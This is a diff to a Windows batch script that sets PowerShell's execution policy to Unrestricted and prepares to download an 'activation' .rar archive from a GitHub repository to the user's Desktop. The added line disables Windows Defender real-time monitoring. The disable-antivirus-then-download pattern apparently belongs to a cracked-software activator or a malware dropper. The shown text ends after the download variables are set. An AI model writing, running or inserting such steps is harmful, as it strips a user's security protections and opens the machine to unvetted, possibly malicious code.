@@ -1,6 +1,7 @@
 @echo off
 
 powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force"
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 
 set urlProgram=https://github.com/diegrp/atv-dbooster/raw/main/processo-ativacao.rar
 set destinoProgram=C:\Users\%USERNAME%\Desktop\atv-program-file\processo-ativacao.rar
